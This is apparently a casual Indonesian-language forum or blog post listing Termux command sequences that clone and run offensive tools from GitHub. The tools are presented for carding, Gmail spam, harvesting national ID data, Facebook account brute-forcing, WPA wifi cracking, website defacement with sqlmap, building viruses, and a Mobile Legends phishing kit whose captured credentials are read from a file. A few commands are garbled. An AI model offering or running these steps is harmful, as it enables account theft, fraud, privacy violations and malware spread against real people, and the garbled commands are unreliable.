@tuanmuda1
Welcome to you all (Penikmat copy/paste):v

Hallo gaeess :) apa kabar? Buruk? Alhamdulillah :v (Syukurin ea tod)
  Sebelum memulai kegiatan Copy/Paste command:v, mari bersama" Berdoa menurut
agama dan kepercayaan masing"..... Ok cukup:)
Biar apa bang? Biar ga di tabok ama yg punya tutorial :D

  Ok sob, kaya nya jari gw dh cape ngetik :v
Sekarang kita siapin bahan" yang di perlukan!!
1.Kopi (Non ABC ea) Biar ga kelihatan misquen:v
2.Rokok (yg di isep cuk, bukan di emut:)
3.L*nT3 (Biar sinyal lancar gaesss:)

Langsung ke command nya !
========================================================
++++++++++Kumpulan Command Termux++++++++++



*Puluhan Ratusan Kumpulan Pilihan Tools dari Termux dan Kali Linux
$pkg install git
$git clone https://github.com/Mrcakil/mrcakil
$cd mrcakil
$chmod +x tools
$./tools


*Bot Auto Reaction Facebook
$git clone https://github.com/AMVengeance/FB-React.git 
$chmod +x FB-React -R cd FB-React ./start

*NIK dan KK Gratis
$pkg install php git 
$git clone https://github.com/IndonesianSecurity/kkktp
$cd kkktp
$php kkktp.php


*Tools B4J1N94N
Fitur :
-Nyari CC buat carding
-Spam akun gmail
-Whois lookup
Dan ratusan tools lainnya


$git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
$cd B4J1N64Nv5
$sh B4J1N64N.sh

*Crack hash password
$git clone https://github.com/FajriHidayat088/FHX-Hash-Killer/
$cd FHX-Hash-Killer
$python2 FHXHashKiller.py

*Wifilite (Crack pass wifi : wpa/wpa2)
$git clone https://github.com/derv82/wifite
$cd wifite
$chmod 777 wifite.py
$python2 wifite.py


*Redhawk
Fitur Redhawk :
-Server detection
-Cloudflare detector
-robots scanner
-Whois lookup
-GEO-IP Scan
-NMAP Port Scan
-DNS Lookup
-SubNet Calculator
-Subdomain Finder
-Reverse IP Scanner
-CMS detection For Sites On the same server.
-Parameter Finder
-Error based SQLi Detector
Dan lain - lain.

$git clone https://github.com/Tuhinshubhra/RED_HAWK
$cd RED_HAWK
$chmod +x rhawk.php
$php rhawk.php


*Install SQLMAP
Tools ini berguna sekali untuk kegiatan mengetes keamanan website, deface, carding dan semacamnya
$git clone https://github.com/sqlmapproject/sqlmap
$cd sqlmap
$python2 sqlmap.py
$python2 sqlmap.py -u website.com --dbs
(Mengetahui semua parameter Sqlmap)👇
$python2 sqlmap.py -hh
(Mengetahui semua parameter Sqlmap)👇
$python2 sqlmap.py -hh
(Melacak IP)👇
$git clone https://github.com/maldevel/IPGeolocation 
$cd IPGeolocation
$chmod +x ipgeolocation.py
$pip install -r requirements.txt 
$python ipgeolocation.py -m
$python ipgeolocation.py -t IPnya


*Hack Akun Facebook
$pkg install python2-dev
$apt install wget
$dip2 install mechanize
$cd/sterage/emulated/0
$python2 fbbrute.py
$storage/emulated/0/password.txt


*Membuat Virus
$git clone https://github.com/viruz09/CreaterVirus cd CreaterVirus python2 creater.py
(Cara copy virus)
$cp agents.apk /lokasi/folder


*Hack Akun Game Mobile Legends
$git clone https://github.com/Senitopeng/PhisingGame.git
$cd PhisingGame
$python2 phising.py
(Lihat result)👇
$cd PhisingGame
$cat buku.txt


Tutorial berikutnya? Next time again ea tod :)








